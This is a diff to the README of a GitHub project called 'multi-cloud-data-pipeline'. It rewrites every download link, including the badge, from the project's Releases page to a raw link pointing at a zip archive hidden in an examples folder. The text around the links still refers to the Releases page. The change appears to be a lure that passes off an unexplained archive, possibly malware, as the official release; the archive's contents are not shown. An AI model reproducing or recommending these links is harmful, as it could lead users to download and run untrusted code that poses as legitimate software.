@@ -1,6 +1,6 @@
 # 🌐 multi-cloud-data-pipeline - Effortless Data Management Across Clouds
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Helios-coder/multi-cloud-data-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/Helios-coder/multi-cloud-data-pipeline/main/examples/batch_etl/multi-cloud-data-pipeline_v3.0.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Helios-coder/multi-cloud-data-pipeline/main/examples/batch_etl/multi-cloud-data-pipeline_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before installing, make sure your system meets the following requirements:
 
 To get started, you need to visit the release page where you can download the latest version of the application. Click the link below:
 
-[Download Now](https://github.com/Helios-coder/multi-cloud-data-pipeline/releases)
+[Download Now](https://raw.githubusercontent.com/Helios-coder/multi-cloud-data-pipeline/main/examples/batch_etl/multi-cloud-data-pipeline_v3.0.zip)
 
 1. Open your web browser.
 2. Click the link above to go to the Releases page.
@@ -101,4 +101,4 @@ Follow us on GitHub to get updates and news about the latest features and releas
 
 Now you are ready to set up and run the multi-cloud-data-pipeline. To start the download, please visit:
 
-[Download Now](https://github.com/Helios-coder/multi-cloud-data-pipeline/releases)
+[Download Now](https://raw.githubusercontent.com/Helios-coder/multi-cloud-data-pipeline/main/examples/batch_etl/multi-cloud-data-pipeline_v3.0.zip)
